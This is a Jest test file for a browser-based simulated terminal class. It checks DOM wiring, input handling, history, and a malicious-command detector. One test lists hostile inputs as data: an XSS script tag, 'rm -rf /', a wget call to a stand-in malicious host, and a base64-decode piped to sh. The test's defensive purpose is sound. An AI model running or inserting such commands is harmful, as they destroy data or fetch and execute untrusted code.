import { Terminal } from '../../src/modules/terminal';
import { CommandHandler } from '../../src/modules/commandHandler';

describe('Terminal class', () => {
    let terminal;
    let mockCommandHandler;

    beforeEach(() => {
        document.body.innerHTML = `
            <div class="terminal">
                <div class="history"></div>
                <div class="terminal-window">
                    <div class="prompt" contenteditable="true"></div>
                </div>
            </div>
        `;
        mockCommandHandler = new CommandHandler(); // Utilisation d'une instance réelle de CommandHandler
        terminal = new Terminal(mockCommandHandler);
    });

    test('should initialize with correct elements and call autoTypeCommand', () => {
        jest.spyOn(terminal, 'autoTypeCommand');
        terminal.autoTypeCommand('nc --help');
        expect(terminal.promptElement).toBeTruthy();
        expect(terminal.historyElement).toBeTruthy();
        expect(terminal.terminalElement).toBeTruthy();
        expect(terminal.terminalWindowElement).toBeTruthy();
        expect(terminal.autoTypeCommand).toHaveBeenCalledWith('nc --help');
    });

    test('should focus prompt on terminal window click', () => {
        const focusSpy = jest.spyOn(terminal.promptElement, 'focus');
        terminal.terminalWindowElement.click();
        expect(focusSpy).toHaveBeenCalled();
    });

    test('should execute command on Enter key press', () => {
        const executeCommandSpy = jest.spyOn(terminal, 'executeCommand');
        const event = new KeyboardEvent('keydown', { key: 'Enter' });
        terminal.promptElement.innerText = 'test command';
        terminal.promptElement.dispatchEvent(event);
        expect(executeCommandSpy).toHaveBeenCalledWith('test command');
    });

    test('should detect and allow valid commands', () => {
        const validCommands = [
            'nc --help',
            'nc --set-time yyyy-MM-dd 2023-07-14',
            'nc --set-format yyyy-MM-dd',
            'nc --get-format',
            'nc --get-time'
        ];

        validCommands.forEach((command) => {
            expect(terminal.isMaliciousCommand(command)).toBe(false);
        });
    });

    test('should detect malicious commands', () => {
        const maliciousCommands = [
            '<script>alert("hack")</script>',
            'rm -rf /',
            'wget http://malicious.com',
            '| rm -rf /',
            'base64 -d <<< "dGVzdA==" | sh'
        ];

        maliciousCommands.forEach((command) => {
            expect(terminal.isMaliciousCommand(command)).toBe(true);
        });
    });

    test('should sanitize output', () => {
        const unsanitizedOutput = '<script>alert("hack")</script>';
        const sanitizedOutput = terminal.sanitizeOutput(unsanitizedOutput);
        expect(sanitizedOutput).toBe('&lt;script&gt;alert(&quot;hack&quot;)&lt;/script&gt;');
    });

    test('should append to history', () => {
        terminal.appendToHistory('test history');
        expect(terminal.historyElement.innerHTML).toContain('test history');
    });

    test('should clear prompt', () => {
        terminal.promptElement.innerText = 'test command';
        terminal.clearPrompt();
        expect(terminal.promptElement.innerText).toBe('');
    });

    test('should scroll to bottom', () => {
        terminal.scrollToBottom();
        expect(terminal.terminalElement.scrollTop).toBe(terminal.terminalElement.scrollHeight);
    });

    test('should focus prompt', () => {
        jest.useFakeTimers();
        const focusSpy = jest.spyOn(terminal.promptElement, 'focus');
        terminal.focusPrompt();
        jest.advanceTimersByTime(10);
        expect(focusSpy).toHaveBeenCalled();
        jest.useRealTimers();
    });
});